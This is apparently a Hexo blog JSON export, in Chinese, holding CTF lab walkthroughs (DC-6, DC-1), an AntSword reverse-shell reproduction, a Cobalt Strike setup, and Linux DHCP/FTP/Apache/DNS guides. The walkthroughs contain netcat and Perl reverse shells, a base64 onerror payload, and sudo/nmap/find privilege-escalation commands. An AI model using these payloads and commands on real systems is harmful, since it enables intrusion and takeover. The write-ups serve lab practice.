{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"John Doe","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"Hello World","slug":"hello-world","date":"2019-05-23T05:57:21.073Z","updated":"2019-05-23T05:57:21.073Z","comments":true,"path":"2019/05/23/hello-world/","link":"","permalink":"http://yoursite.com/2019/05/23/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"DC6攻击记录","slug":"Dc6","date":"2019-05-17T12:37:59.000Z","updated":"2019-05-24T03:58:13.605Z","comments":true,"path":"2019/05/17/Dc6/","link":"","permalink":"http://yoursite.com/2019/05/17/Dc6/","excerpt":"","text":"DC6渗透记录 主机发现 $ netdiscover 得到192.168.105.143这个ip 扫描端口 1$ nmap -sV -A -p- 192.168.105.143 访问80端口，可以看到 http://wordy/，却无图像显示我们添加一下hosts文件 1192.168.105.143 wordy 用7kb扫描目录，得知是wordpress的站点，用wpscan枚举用户 1wpscan --url http://wordy/ -e 得到五个用户，将用户写入user.txt 接下来切一份密码字典出来 1cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; pass.txt 接下来，开始用wpscan跑密码wpscan –url http://wordy/ -U user.txt -P pass.txt 接下来用密码登陆wordpres这个wordpress是有一个cve的，利用方法 kali里有一个自带的模块也可以查找exp 1$ searchsploit Activity monitor 接下来，开始利用此漏洞（已知此漏洞可以命令执行） 先点击Activity monitor然后在点击tool 填入数值后，点击lookup，然后burp抓包 可以看出，此处可以进行命令执行，接下来，构造反弹shell 监听成功，接下来，我们需要获取一个交互式shell 1python -c &apos;import pty;pty.spawn(&quot;/bin/sh&quot;)&apos; 开始提权发现suid无法提权，于是开始随意翻找，在/home/mark/stuff/things-to-do.txt中找到一个账号和密码用ssh登陆进去 1$ ssh graham@192.168.105.143 查看这个用户能执行的文件 1$ sudo -l 找到一个backups.sh，可以执行，而且还有读写权限的文件，而且，改文件的所属是jens用户，所以，我们可以切换到jens执行此文件,我们可以用此文件反弹回jens用户的权限， 12$ echo &quot;nc -e /bin/sh 192.168.105.147 444&quot; &gt;&gt; backups.sh$ sudo -u jens ./backups.sh 命令成功执行，接下来，我们用nc监听反弹回的会话（先监听，后执行） 1$ nc -lvp 444 查看jens可以执行的程序 1$ sudo -l 发现一个nmap，使用root执行的，而且不需要root密码，我们可以使用nmap提权 先写一个nmap插件nse 1$ echo &apos;os.execute(&quot;/bin/sh&quot;)&apos; &gt; fuck_root.nse 接下来用nmap加载这个插件$ sudo nmap –script=/home/jens/fuck_root.nse可以看到，已经是root权限了，接下来，让我们去看flag ​","categories":[],"tags":[{"name":"FLAG","slug":"FLAG","permalink":"http://yoursite.com/tags/FLAG/"}]},{"title":"dc1靶场渗透","slug":"dc1","date":"2019-04-17T12:37:59.000Z","updated":"2019-05-26T04:38:59.069Z","comments":true,"path":"2019/04/17/dc1/","link":"","permalink":"http://yoursite.com/2019/04/17/dc1/","excerpt":"","text":"Dc1靶场渗透 内网发现 $ netdiscover {width=”499”height=”140”} 端口扫描 1&lt;span lang=&quot;en-US&quot;&gt;$ nmap -sV -A -p- 192.168.72.139&lt;/span&gt; {width=”492”height=”173”} 发现开了一个80端口，于是访问这个端口 {width=”425”height=”133”} 发现是drupal cms，这个cms是有exp的，可以用msfconsole直接打 $ msfconsole $ msf5&gt; useexploit/unix/webapp/drupal_drupalgeddon2 {width=”439”height=”170”} 如图，我们已经得到了meterpreter， 首先，我们getuid一下查看当前权限，发现权限是www-data 开始提权 先进入shell，获取交互式 $ python -c ‘import pty;pty.spawn(“/bin/ba”)’ #获取交互式 {width=”503”height=”139”} 查询suid发现，没有可以利用的软件 {width=”554”height=”189”} 查询内核，寻找内核漏洞进行提权 {width=”554”height=”60”} 使用searchsploit，击机命令行输入 $ searchsploit linux 3.2.0 {width=”475”height=”113”} {width=”609”height=”198”} 攻击失败， 查找到一个具有用户权限还可写可执行的文件夹， {width=”486”height=”146”} {width=”554”height=”140”} 使用find利用此漏洞 新建一个文件， $ touch anqak $ find anqak -exec ‘whoami’ \\; $ find anqak -exec ‘/bin/sh’ \\; {width=”554”height=”157”} 提权成功","categories":[],"tags":[{"name":"FLAG","slug":"FLAG","permalink":"http://yoursite.com/tags/FLAG/"}]},{"title":"antsword蚁剑","slug":"antsword","date":"2019-04-17T12:37:59.000Z","updated":"2019-05-24T01:56:05.125Z","comments":true,"path":"2019/04/17/antsword/","link":"","permalink":"http://yoursite.com/2019/04/17/antsword/","excerpt":"","text":"antsword 反弹shell的复现 首先下载软件和源码（受影响源码为2.7） 我这里用了两台linux虚拟机复现（Ubuntu和centos7） 1，先用centos7搭一个php环境，然后把shell.php丢进去 ​ shell.php内容为： 123456789```&lt;?phpheader(\"HTTP/1.1 406 Not &lt;img src=# onerror='eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ3BlcmwgLWUgXCd1c2UgU29ja2V0OyRpPSIxOTIuMTY4LjcyLjEzMyI7JHA9MTAwMjtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL2Jhc2ggLWkiKTt9O1wnJywoZXJyb3IsIHN0ZG91dCwgc3RkZXJyKT0+ewogICAgYWxlcnQoYHN0ZG91dDogJHtzdGRvdXR9YCk7CiAgfSk7`,`base64`).toString())'&gt;\");?&gt;``` ​ 此代码用的是perl的反弹shell 请自行确保你的linux中有perl 123require('child_process').exec('perl -e \\'use Socket;$i=\"192.168.72.133\";$p=1002;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/bash -i\");&#125;;\\'',(error, stdout, stderr)=&gt;&#123; alert(`stdout: $&#123;stdout&#125;`); &#125;); ​ 可自行替换复制用base64加密后利用 我这里用的是宝塔 ​ 得到shell.php地址,完成第一步 ​ 我的地址为：http://192.168.72.133:3456/shell.php ​ 2，用buntu安装蚁剑， ​ 首先解压并经入到AntSword-v2.0.1-linux-x64然后打开命令行，用 ​ ​ $ ./Antsword 运行 ​ 将antSword-2.0.7添加为源 ​ 重新启动Antsword 就可以运行了 ​ ​ 然后将 centos7的shell路径添加进来 ​ ​ 双击进行连接，会促发alert事件， 3，切换到centos7 ​ $ nc -l 1002 ​ 对1002端口进行监听就可以返回shell了 ​ ​","categories":[],"tags":[{"name":"repetition","slug":"repetition","permalink":"http://yoursite.com/tags/repetition/"}]},{"title":"burp_mobile","slug":"burp-mobile","date":"2019-04-14T05:48:02.000Z","updated":"2019-05-24T01:58:55.940Z","comments":true,"path":"2019/04/14/burp-mobile/","link":"","permalink":"http://yoursite.com/2019/04/14/burp-mobile/","excerpt":"","text":"1,首先，打开burpsuite ，在option下增加一个代理规则 2，然后勾选你新建的规则， 3，要确保你的手机和电脑是在同一个wifi下，然后点击wifi，修改WiFi的设置，添加手动代理 4，然后用浏览器访问http://burp/ 5,下载证书并导入，就可以抓https的了 ​","categories":[],"tags":[{"name":"BURP","slug":"BURP","permalink":"http://yoursite.com/tags/BURP/"}]},{"title":"Cobalt Strike搭建和使用","slug":"Cobalt-Strike搭建和使用","date":"2019-04-13T06:30:05.000Z","updated":"2019-04-13T14:37:27.380Z","comments":true,"path":"2019/04/13/Cobalt-Strike搭建和使用/","link":"","permalink":"http://yoursite.com/2019/04/13/Cobalt-Strike搭建和使用/","excerpt":"","text":"kali默认的java是openjdk的首先安装oracle-java导入公钥 apt-key adv –keyserver hkp://keyserver.ubuntu.com:80 –recv-keys EEA14886添加源deb http://ppa.launchpad.net/webupd8team/java/ubuntu trusty maindeb-src http://ppa.launchpad.net/webupd8team/java/ubuntu trusty main更新源 apt-get update开始安装 apt-get install oracle-java8-installer cobalstrike3.8链接：https://pan.baidu.com/s/159V0aMYmLloxQGFRFrhjgA提取码：6ob3 cd 进入 chmod -x ./teamserver ./teamserver 192.168.72.134 password新建命令行 Java -jar cobaltstrike.jar更改密码为password即可登陆","categories":[],"tags":[{"name":"KALI_freekill","slug":"KALI-freekill","permalink":"http://yoursite.com/tags/KALI-freekill/"}]},{"title":"python开http","slug":"python开http","date":"2019-04-10T13:36:31.000Z","updated":"2019-04-10T13:42:09.035Z","comments":true,"path":"2019/04/10/python开http/","link":"","permalink":"http://yoursite.com/2019/04/10/python开http/","excerpt":"","text":"PYTHON2​ python -m SimpleHTTPServer PYTHON3​ python3 -m http.server","categories":[],"tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"http://yoursite.com/tags/PYTHON/"}]},{"title":"python识别字符串中是否存在中文","slug":"python-screen-chinese","date":"2019-03-20T15:11:40.000Z","updated":"2019-03-20T15:22:58.000Z","comments":true,"path":"2019/03/20/python-screen-chinese/","link":"","permalink":"http://yoursite.com/2019/03/20/python-screen-chinese/","excerpt":"","text":"使用python查询字符串中是否含有中文字符， 1234567891011def screen_chinese(text): \\#判断字符串是否存在汉字的函数 bool1=&apos;&apos; r = re.compile(u&apos;[\\u4e00-\\u9fa5]&apos;) str1 = r.search(text) if str1 : bool1 =True else: bool1 = False return bool1print(screen_chinese(text))","categories":[],"tags":[{"name":"PYTHON_str_deal","slug":"PYTHON-str-deal","permalink":"http://yoursite.com/tags/PYTHON-str-deal/"}]},{"title":"msf_scanner","slug":"msf-scanner","date":"2019-03-13T06:34:29.000Z","updated":"2019-03-13T06:37:12.000Z","comments":true,"path":"2019/03/13/msf-scanner/","link":"","permalink":"http://yoursite.com/2019/03/13/msf-scanner/","excerpt":"","text":"一：基于scanner/http/http_version发现HTTP服务二：基于scanner/smb/smb_version发现SMB服务三：基于scanner/ftp/ftp_version发现FTP服务四：基于scanner/discovery/arp_sweep发现内网存活主机五：基于scanner/discovery/udp_sweep发现内网存活主机","categories":[],"tags":[{"name":"MSF","slug":"MSF","permalink":"http://yoursite.com/tags/MSF/"}]},{"title":"LINUX DHCP 搭建","slug":"LINUX-dhcp搭建","date":"2018-12-25T09:31:53.000Z","updated":"2018-12-29T02:11:36.000Z","comments":true,"path":"2018/12/25/LINUX-dhcp搭建/","link":"","permalink":"http://yoursite.com/2018/12/25/LINUX-dhcp搭建/","excerpt":"","text":"DHCP服务搭建： 了解了dncp的基本原理之后，接下来，我们开始搭建DHCP服务器： 首先，先查看一下可安装的DHCP软件，终端输入： #yum list dhcp* 然后，再开始安装DHCP： #yum install dhcp 安装成功后，此时启动dhcpd是启动不了的，还需要更改配置文件，dhcp的主配置文件在/etc/dhcp/dhcpd.conf里，此时这个文件里是没有配置文件的，可使用以下命令查看： #cat /etc/dhcp/dhcpd.conf 接下来，我们可以参考/usr/share/doc/dhcp-4.2.5下的dhcpd.conf.Example文件使用命令，将此文件复制过来； # cp /usr/share/doc/dhcp-4.2.5/dhcpd.conf.example /etc/dhcp/dhcpd.conf 然后，在弹出的是否覆盖输入y即可， 界限来我们开始更改配置文件 #vi /etc/dhcp/dhcpd.conf 如下图更改： Subnet 后面的是你的网段加0，netmask是你的子网掩码，range是你的DHCP的范围，更改好之后，保护退出 接下来启动dhcp # systemctl restart dhcpd 到这里为止，dhcp搭建成功，接下来可以接交换机测试 确保接入交换机，回到宿主机，打开cmd，输入ipconfig先查看本机ip，接下来输入： ipconfig /release 再输入： Ipconfig /renew ipconfig/release的意思是删除当前ip， Ipconfig /renew的意思是获取一个新的ip， 如果你的宿主机，获取到了一个你设置的DHCP网段内的ip，那就证明你的DHCP搭建成功且能正常服务了， 接下来再，回到你的虚拟机，查看DHCP租约情况 DHCP租约情况一般放置在/var/lib/dhcpd/ 下的dhcpd.leases 用命令打开 #gedit /var/lib/dhcpd/dhcpd.leases 会看到如下图所示： 当出现如图所示的情况，你的DHCP就大功告成了。","categories":[],"tags":[{"name":"LINUX","slug":"LINUX","permalink":"http://yoursite.com/tags/LINUX/"}]},{"title":"LINUX FTP 搭建","slug":"ftp","date":"2018-12-25T09:31:53.000Z","updated":"2018-12-29T02:13:04.000Z","comments":true,"path":"2018/12/25/ftp/","link":"","permalink":"http://yoursite.com/2018/12/25/ftp/","excerpt":"","text":"FTP服务搭建：FTP简介： FTP是文件传输控制协议，是用于TCP/IP网络及Internet的最简单的协议之一。FTP可将文件从网络上的计算机传送到网络上的另一台计算机，并且具备双向传输功能，在服务器端许可的前提下，可以非常方便地将文件从本地计算机发送给远程FTP站点。 ftp的两种工作模式： 1、主动模式（PORT方式） 工作原理：客户端从一个任意的非特权端口（大于1024）N连接到FTP服务器的命令端口，也就是21端口。然后客户端开始监听端口N+1，并发送FTP命令“port N+1”到FTP服务器。接着服务器会从它自己的数据端口（20）连接到客户端指定的数据端口（N+1） 2、被动模式（PASV方式） 工作原理：当开启一个 FTP连接时，客户端打开两个任意的非特权本地端口（大于1024）N和N+1。第一个端口连接服务器的21端口，但与主动方式的FTP不同，客户端不会提交PORT命令并允许服务器来回连它的数据端口，而是提交PASV命令。这样做的结果是服务器会开启一个任意的非特权端口（大于1024）P ，并发送PORT P命令给客户端。然后客户端发起从本地端口N+1到服务器的端口P的连接用来传送数据。然后FTP服务器将通过这个端口进行数据的传送，这个时候FTP server不再需要建立一个新的和客户端之间的连接。 我们需要安配置的是被动模式的FTP 步骤一： 查询并安装vsftp和ftp客户端 # yum list vsftp # yum install vsftp -y # yum install ftp -y 接下来，等待程序安装完成 安装完成后，我们可以把ftp加入到开机自启动 # systemctl enable vsftpd # systemctl disable vsftpd (解除开机启动) 默认的ftp的分享的文件为／var/ftp/pub我们可以把需要分享的文件放在这个目录里，别人登陆你的ftp后即可下载 步骤二： 因为步骤一，我们已经在本机安装了ftp客户端，所以现在，我们直接可以在客户端进行测试连接ftp 服务器,首先，我们需要重启一下vsftp服务器在进行连接 # systemctl restart vsftpd # ftp 192.168.5.147 在弹出的账号输入 ftp 密码也输入ftp即可成功登陆。如下图 {width=”423”height=”166”} 步骤三： 介于ftp是文件分享协议，主要输提供给别人下载文件的，所以不能只在主机中测试，需要到宿主机去试一下， 来到宿主机，打开cmd 输入ftp 192.168.5.147 会显示 无法连接到主机：经验之谈，应该是虚拟机防火墙的问题 因为ftp默认的端口是21端口，我们可以开放这个端口，或者暴力的把 防火墙关掉 # systemctl restart firewald （关闭防火墙） # firewall-cmd –zone=public –add-port=21/tcp（开放21） 此时的防火墙已经关闭了，可以回到宿主机重新连接： \\ {width=”558”height=”118”} 步骤四： 创建一个只能登陆ftp的匿名用户登陆 新建一个不能登录系统用户. 只用来登录ftp服务 ,这里如果没设置用户目录。默认是在home下： # useradd ftpuser -s /sbin/nologin 为ftpuser用户设置密码： # passwd ftpuser 接下来尝试用匿名用户登陆; {width=”385”height=”135”} 步骤5：创建ftpFTP虚拟用户 \\ 1，修改/etc/vsftpd/vsftpd.conf文件 1234567anonymous_enable=NO 匿名用户允许登陆anon_upload_enable=NOanon_mkdir_write_enable=NOlocal_enable=YES 本地用户允许登陆chroot_local_user=YESguest_enable=YES ftp虚拟用户允许登陆guest_username=vuser 填与匿名用户关联的系统用户 2，创建编辑用户文件在终端输入： # vim /etc/vsftpd/virtusers 第一行为用户名，第二行为密码。不能使用root作为用户名 \\{width=”352”height=”110”} 生成用户数据文件，并给他读写的权限 # db_load -T -t hash -f /etc/vsftpd/virtusers /etc/vsftpd virtusers.db # chmod 600 /etc/vsftpd/virtusers.db *注意：生成数据库文件以后，为了保险起见，可以把virtusers文件删除，或者将它隐藏 设定PAM验证文件，并指定对虚拟用户数据库文件进行读取 3，修改 /etc/pam.d/vsftpd 文件 修改前先备份 # cp /etc/pam.d/vsftpd /etc/pam.d/vsftpd.bak # vi /etc/pam.d/vsftpd 先将配置文件中原有的所有配置行注释掉在下面加入这两行，数据库名为你开始创建的用户数据库，不用加db后缀, 12auth sufficient /lib64/security/pam_userdb.so db=/etc/vsftpd/virtusers\\ account sufficient /lib64/security/pam_userdb.so db=/etc/vsftpd/virtusers\\ {width=”397”height=”201”} , 4，用户登录终端设为/bin/false(即：使之不能登录系统) #useradd vsftpd -d /home/vsftpd -s /bin/false # chown -R vsftpd:vsftpd /home/vsftpd {width=”457”height=”63”} 5，建立虚拟用户个人配置文件 # mkdir /etc/vsftpd/vconf # cd /etc/vsftpd/vconf 编辑lzq用户配置文件，内容如下，其他用户类似 #vi lzq 文件内容如下： 123456local_root=/home/vsftpd/lzq/write_enable=YESanon_world_readable_only=NOanon_upload_enable=YESanon_mkdir_write_enable=YESanon_other_write_enable=YES 6，建立lzq用户根目录 #mkdir -p /home/vsftpd/lzq/ 接下来，尝试重启一下ftp服务器： # systemctl restart vsftpd # ftp 192.168.5.147 输入你的ftp虚拟用户lzq的账号和密码，发现可以成功登陆， {width=”389”height=”158”} 我们尝试用没加用户文件的用户liu尝试登陆： {width=”315”height=”170”} 结果，出现 “500 OOPS: chroot”此字符，得知，应该是每一个虚拟用户都需要创建一个和它相匹配的用户文件，于是，在终端输入; # cd /etc/vsftpd/vconf # cp lzq liu local_root=/home/vsftpd/lzq/这句话的意思是，该用户指向的根目录为/home/vsftpd/lzq/ ，可以先不做修改，让这两个用户都指向/home/vsftpd/lzq, 接下来： # systemctl restart vsftpd 重新再浏览器访问ftp://192.168.5.147输入liu用户，发现成功 到此为止，ftp搭建成功","categories":[],"tags":[{"name":"LINUX","slug":"LINUX","permalink":"http://yoursite.com/tags/LINUX/"}]},{"title":"LINUX Apache 搭建","slug":"apache","date":"2018-12-25T09:31:53.000Z","updated":"2018-12-28T08:06:16.000Z","comments":true,"path":"2018/12/25/apache/","link":"","permalink":"http://yoursite.com/2018/12/25/apache/","excerpt":"","text":"Apache搭建 本机 ip 192.168.5.147 搭建完成的 Dns服务器,首先需要将DNS服务器切换成192.168.5.147， Apache是php环境的组件， Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一，linux搭建好了apache就相当于windows开启了一个phpstudy，通俗的说就是开启了一个web容器，可以在网页上显示自己的目录。 Apache可以提供httpd服务，在Linux中可以通过 systemctl start httpd开启 接下来开始安装Apache在终端输入: # yum list httpd* 日常加一个*显示所有的匹配项 经过课件的得知，我们要安装的httpd软件有两个 ，分别为httpd 和 httpd-tools 然后，我们编辑yum安装命令，在终端输入： # yum install httpd httpd-tools -y 加一个-y可以减少麻烦，接下来，直接等待httpd安装完成即可，当httpd安装完成后，页面会出现一个apache的页面 {width=”514”height=”245”} 然后，这个页面告诉你，你的文件应该放在 /var/www/html 下要想页面显示出你的目录，你还需要去更改一个地方，终端输入 #Vi /etc/httpd/conf.d/welcome.conf {width=”265”height=”93”} 找到如图所示的地方，把 -Indexes 的‘-’给删掉，然后按ESC键 ：wq 保存就好了，保存之后，需要重新启动httpd，终端输入： # systemctl restart httpd 接下来，刷新网页，会出现一个空白的目录，因为此时你的/var/www/html 下是没有文件可以显示的，而且，默认情况下，你的centos7下是没有安装php的，所以此时不能直接解析php文件你可以通过命令安装php： # yum install php 安装好php之后，你的php文件可以解析成功了，这样，web容器就初步搭建成功。 接下来，我们开始尝试将DNS和HTTPD结合起来使用，构建一个基于名字的虚拟主机，首先我们先了解一下apache服务器控制存取方式 Apache对于访问权限的限制包括两种方式，一种是在其配置文件http.conf中直接进行限制，这种限制方法常被称为“整体存取控制”；另一种则是在.htaccess文件中进行，这种则称作“分布式特定目录存取控制”。 首先，保证你的DNS是在正常运行的，然后打开DNS的主文件，目录为/var/named/lzq.com.zone输入以下代码打开 # gedit /var/named lzq.com.zone {width=”370”height=”188”} 按照图片，在文件中添加下面两行代码： sit IN CNAME lzq myweb IN CNAME lzq 接下来保存退出后就好，保存后记得重启一下DNS服务器，代码如下： # systemctl restart named 接下来，我们还需要更改 /etc/httpd/conf/httpd.conf这个文件是httpd的主配置文件，可以考虑提前备份一下 用cp命令可进行备份 # cp /etc/httpd/conf/httpd.conf /etc/httpd/conf/httpd.conf.bak 保存好之后接下来，我们开始更改文件 #gedit /etc/httpd/conf/httpd.conf 可以考虑把文中带#的注释文件全部删除掉，然后，在文章底部添加如下代码： 1234567891011121314151617181920&lt;VirtualHost 192.168.5.147:80&gt; DocumentRoot &quot;/var/www/security&quot; serverName sit.lzq.com ServerAdmin 287691104@qq.com &lt;Directory &quot;/var/www/security&quot;&gt; Options Indexes FollowSymLinks MultiViews AllowOverride all Require all granted &lt;/Directory&gt; &lt;/VirtualHost&gt;&lt;VirtualHost 192.168.5.147:80&gt; DocumentRoot &quot;/var/www/html/security&quot; serverName www.lzq.com ServerAdmin 287691104@qq.com &lt;Directory &quot;/var/www/html/security&quot;&gt; Options Indexes FollowSymLinks MultiViews AllowOverride all Require all granted &lt;/Directory&gt;&lt;/VirtualHost&gt; 注意：AllowOverride默认先设置成none（我的添加了域保护所以是all） 添加好之后，我们需要在 /var/www/ 下创建一个sercuity文件夹，这是我们域名sit.lzq.com 指向的文件夹，创建好之后我在里面添加一个hello.Html文件，方便等一下辨认，然后，我们还需要在，/var/www/html/ 下添加一个security文件夹， 同样的，在里面创建一个hellowold.html文件。也可以直接在命令行创建这两个文件夹 # mkdir /var/www/security # mkdir /var/www/html/security 创建好之后，开始重启http服务器 # systemctl restart httpd 然后在。在浏览器输入sit.lzq.com会出现如下图所示页面 {width=”392”height=”174”} 然后再输入www.lzq.com 会出现下图所示 {width=”474”height=”206”} 现在，你的网站已经可以用DNS的这两个域名访问了，接下来，我们开始给这个网站添加用户和密码，限制其他人的访问 首先先 在/usr/local/创建一个httpd文件夹 # mkdir /usr/local/etc/httpd 然后，在该目录下创建一个存储用户名和密码的隐藏文件 # htpasswd -c /usr/local/etc/httpd/.htpasswd lzq 这条命令是创建一个用户在htpasswd文件中，点.的意思是隐藏，接下来会叫你输入两次密码。输入就好了。 接下来，我们回到 /var/www/html/security 文件夹下，新建一个htaccess隐藏文件，在新建的htaccess文件夹下，添加如下代码： 1234AuthName &quot;password&quot;AuthType BasicAuthUserFile /usr/local/etc/httpd/.htpasswdRequire valid-user 保存退出，接下来重启一下httpd服务 # systemctl restart httpd 注意：需要把浏览器重启一下，或者清除一下浏览器数据在重新刷新一下，就可以去访问www.lzq.com了，会出现如图所示的需要登录的界面： {width=”400”height=”224”} 大功告成 \\","categories":[],"tags":[{"name":"LINUX","slug":"LINUX","permalink":"http://yoursite.com/tags/LINUX/"}]},{"title":"LINUX centos7 vmtools 安装","slug":"LINUX-centos7-vmtools-安装","date":"2018-12-16T07:51:56.000Z","updated":"2018-12-29T01:49:54.000Z","comments":true,"path":"2018/12/16/LINUX-centos7-vmtools-安装/","link":"","permalink":"http://yoursite.com/2018/12/16/LINUX-centos7-vmtools-安装/","excerpt":"","text":"如何在centos7上安装VMtools 首先点左右上角虚拟机目录下的安装vmtools 然后桌面会出现一个vmtools光盘 右键打开vmtools光盘 把 VMwareTools-10.3.2-9925305.tar.gz 复制到Home文件夹下 （光盘内文件为只读不可直接解压） 打开home文件夹 右键打开终端先用 # ls 查看一下 home目录下是否有 VMwareTools-10.3.2-9925305.tar.gz文件tar用法如下然后输入 #tar -xzf VMwareTools-10.3.2-9925305.tar.gz 然后输入 # cd vmware-tools-distrib # ls # ./vmware-install.pl $ sudo ./vmware-install.pl /(此命令需要root权限) 一路Enter 需要输入 yes 和 no 时就按照提示输入不需要的地方就按Enter当页面显示enjoy时安装完成最后重启一下就可以了","categories":[],"tags":[{"name":"LINUX","slug":"LINUX","permalink":"http://yoursite.com/tags/LINUX/"}]},{"title":"LINUX DNS 搭建","slug":"LINUX-DNS-搭建","date":"2018-12-15T09:31:53.000Z","updated":"2018-12-19T08:55:06.000Z","comments":true,"path":"2018/12/15/LINUX-DNS-搭建/","link":"","permalink":"http://yoursite.com/2018/12/15/LINUX-DNS-搭建/","excerpt":"","text":"DNS相关信息 1. 什么是DNS DNS（Domain Name System，域名系统），万维网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过域名，最终得到该域名对应的IP地址的过程叫做域名解析（或主机名解析）。 2. DNS的功能 每个IP地址都可以有一个主机名，主机名由一个或多个字符串组成，字符串之间用小数点隔开。有了主机名，就不要死记硬背每台IP设备的IP地址，只要记住相对直观有意义的主机名就行了。这就是DNS协议的功能。主机名到IP地址的映射有两种方式： 1）静态映射，每台设备上都配置主机到IP地址的映射，各设备独立维护自己的映射表，而且只供本设备使用；2）动态映射，建立一套域名解析系统（DNS），只在专门的DNS服务器上配置主机到IP地址的映射，网络上需要使用主机名通信的设备，首先需要到DNS服务器查询主机所对应的IP地址。 如何在centos7上安装DNS 1.了解centos7上所用的bind BIND(Berkeley Internet Name Domain)BIND（Berkeley Internet Name Daemon）是现今互联网上最常使用的DNS服务器软件，使用BIND作为服务器软件的DNS服务器约占所有DNS服务器的九成。BIND现在由互联网系统协会（Internet Systems Consortium）负责开发与维护。 2.准备环境 vmware15 (用来安装虚拟机)centos7一台（服务器）ip = 192.168.5.135 （在终端输入’ifconfig’可查看ip） 3.开始安装首先打开终端（右键桌面有打开终端选项）查看所有可以安装的bind软件 1. 用yum安装 # yum list bind*(*通配符，表示所有)未安装的： 安装之后的：如图，我的已经安装好了你们可用 # yum install bind bind-libs bind-chroot -y (-y 表示需要确认时选择y) 2. 也可用rpm 进行安装 # rpm -qa|grep bind*(首先先查询一下) DNS服务通常需要安装的RPM软件包如下： ① bind-9.9.4-61.el7.x86_64.rpm该软件包为DNS服务主程序包，服务器必须安装！② bind-libs-9.9.4-61.el7.x86_64.rpm该软件包提供实现域名解析功能必备的库文件 ③ bind-chroot-9.9.4-61.el7.x86_64.rpm该软件包的作用是将运行限制在一个虚拟根目录下，以隐藏运行时的真实目录。 将上述主要软件包先复制到系统某个目录（例如root）下 ,然后再通过rpm命令安装到系统中。rpm安装命令(参考) # rpm -ivh bind-9.9.4-61.el7.x86_64.rpm # rpm -ivh bind-libs-9.9.4-61.el7.x86_64.rpm # rpm -ivh bind-chroot-9.9.4-61.el7.x86_64.rpm 安装完成后 Dns 可正常启动，但无法正常运行 需要更改配置文件 4.更改配置文件 1. 关于主配置文件 /etc/named.conf在修改主配置文件 /etc/named.conf之前，请先作备份： # cp /etc/named.conf /etc/named.conf.bak $ sudo cp /etc/named.conf /etc/named.conf.bak Bind的主配置文件是/etc/named.conf，该文件只包括Bind的基本配置，并不包含任何DNS区域数据。/etc/named.conf 文件说明： /etc/named.conf文件说明DNS服务器的全局参数，由多个BIND配置命令所组成，每个配置命令后是参数和用大括号括起来的配置子句块，各配置子句也包含相应的参数，并以分号结束，其语法类似于C语言。named.conf文件中最常用的配置语句有两个：options语句和zone语句。参数说明： options { listen-on port 53 { 127.0.0.1; };// ipv4监听端口和ip地 址，默认只有本地的listen-on-v6 port 53 { ::1; }; // ipv6的监听端口和ip地址directory “/var/named”; //定义DNS区域数据文件的读写路径allow-query { localhost; }; //允许可对本DNS进行查询的客户机recursion yes; // yes 是允许递归查询,off不允许dnssec-enable yes; //3条关于DNS安全的设置dnssec-validation yes; //表示在DNS查询的过程中加密,no 不加密include “/etc/named.rfc1912.zones”; // 把named.rfc1912.zones文件包含进来 2.接下来，开始更改配置文件首先 运行下面这条代码 $ sudo gedit /ect/named.conf 或 # gedit /ect/named.conf打开文件后 如下图更改 注意 192.168.5.135 为我的主机ip，你们填自己的ip就可以了根据自己要求添加 DNS配置要求：在本网络能够解析2个域名称： lzq.com ahead.net 和一个反向解析 更改完成后接下来开始创建zone文件 3.接下来，开始编写zone文件1.在终端输入如下代码，创建并编写文件: # gedit /var/named/192.168.5.zone $ sudo gedit /var/named/192.168.5.zone其他2个自行替换 2.或者直接用图形化进入文件夹，右键创建文件， 考虑到文件内容过大 点击文件名可进行下载 仅供参考 需要自行更改文件名 主机名和ip 网关等 192.168.5.zone(点击下载)文件内容如下 ahead.net.zone(点击下载)文件内容如下 lzq.com.zone(点击下载)文件内容如下 接下来，还需要更改 /etc/resolv.conf # gedit /etc/resolv.conf$ sudo gedit /etc/resolv.conf 将图中的ip换成你的ip 尝试启动 systemctl restart named (无报错则启动成功)nslookup >lzq.com 如果你的和图中解析的一样的话，dns就初步搭好了","categories":[],"tags":[{"name":"LINUX","slug":"LINUX","permalink":"http://yoursite.com/tags/LINUX/"}]}]}